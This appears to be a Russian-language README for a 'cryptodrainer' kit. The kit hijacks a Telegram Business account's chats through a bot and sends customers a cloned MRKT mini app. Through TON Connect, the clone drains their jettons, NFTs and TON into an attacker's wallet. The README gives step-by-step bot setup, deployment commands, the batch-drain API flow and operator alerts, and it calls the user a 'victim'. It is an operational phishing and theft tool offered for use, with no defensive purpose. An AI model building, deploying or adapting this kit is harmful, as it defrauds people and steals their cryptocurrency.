# cryptodrainer — MRKT funnel (Telegram Business + Mini App)

Схема: **бизнес-аккаунт** в Telegram подключает этого бота как чат-бота → входящие ЛС клиентов обрабатываются ботом **от имени бизнес-профиля** (без пометки «бот» у клиента) → в ответ уходит кнопка **Web App** с клоном MRKT → **TON Connect** → пакетные переводы jetton / NFT / TON на `RECEIVER_WALLET`.

## Структура

| Пакет | Роль |
|--------|------|
| `packages/bot` | Business Mode: `business_connection`, автоответ в ЛС, кнопка mini app |
| `packages/server` | API drain-батчей, tonapi scan, алерты в `ADMIN_CHAT_ID`, раздача собранного mini app |
| `packages/miniapp` | UI в стиле MRKT + TON Connect |

## Подготовка бота

1. [@BotFather](https://t.me/BotFather) → **Bot Settings → Business Mode → Enable**.
2. **Menu Button** или только inline Web App — URL = публичный `MINIAPP_PUBLIC_URL`.
3. Скопируй `.env.example` → `.env` и заполни переменные.

## Подключение Business Mode

1. На аккаунте-«продавце» / «поддержке»: **Настройки → Telegram Business → Чат-боты**.
2. Укажи username твоего бота, включи **ответы на сообщения** (Reply).
3. При подключении бот получит `business_connection` и пишет в `ADMIN_CHAT_ID`.

Любое сообщение клиента в ЛС бизнес-аккаунту → текст про «подтверждение MRKT» + **Открыть MRKT**.

Команда оператора: `/push <chat_id клиента>` — вручную отправить тот же funnel в чат (если знаешь `chat_id`).

## Деплой

Нужен **один HTTPS-домен** для mini app (Telegram требует TLS для Web App и manifest).

```bash
npm install
cp .env.example .env   # заполни
npm run build          # miniapp → packages/miniapp/dist, tsc bot/server
npm run start:server   # :8787, статика + API
npm run start:bot      # long polling
```

`MINIAPP_PUBLIC_URL` и `SERVER_PUBLIC_URL` — публичный origin (если всё на одном домене, можно одинаковые). Manifest: `https://твой-домен/tonconnect-manifest.json`.

Локально: `cloudflared tunnel` / ngrok на 8787, пропиши URL в `.env` и в BotFather (Web App URL).

## Переменные

См. `.env.example`: `BOT_TOKEN`, `ADMIN_CHAT_ID`, `RECEIVER_WALLET`, `MINIAPP_PUBLIC_URL`, опционально `TONAPI_KEY`, лимиты `FEE_RESERVE_TON` / `MIN_BALANCE_TON`.

## Поток drain

1. Жертва открывает Web App из бизнес-переписки.
2. `POST /api/event` — логи в Telegram.
3. После connect — `POST /api/build-batch`: до 4 сообщений за подпись (jetton → NFT → TON), до 12 итераций.
4. Каждая подпись / отказ — событие оператору.

## Dev

Три терминала:

```bash
npm run dev:server
npm run dev:bot
npm run dev:miniapp   # прокси /api на :8787
```

Mini app в Telegram всё равно нужно открывать с HTTPS URL из `.env`, не с `localhost`.
